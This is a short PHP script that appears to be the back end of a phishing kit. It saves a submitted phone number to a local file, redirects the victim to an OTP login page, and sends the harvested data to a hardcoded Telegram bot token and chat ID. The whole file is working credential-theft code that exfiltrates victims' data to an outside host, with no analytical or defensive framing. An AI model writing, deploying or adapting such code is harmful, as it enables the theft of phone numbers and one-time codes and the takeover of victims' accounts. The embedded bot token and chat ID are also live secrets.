<?php

function saveToFile($data, $last = false)
{
    $file = fopen("data.txt", "a+");
    fwrite($file, $data);
    fclose($file);
}
if (isset($_POST["number"])) {
    saveToFile("phone number: ".$_POST["number"]."\n");
    header('Location: otp.login.php');
    $myfile = fopen("data.txt", "r") or die("Unable to open file!");
    $red = fread($myfile,filesize("data.txt"));

    $apiToken = "1890475475:AAHQKVG9l_BxhZwqiG7k0DNrdxtDObeBQ";  //Token Robot Telegram
    
    $data = [
        'chat_id' => '178823019', //ChatID
        'text' => $red
    ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
}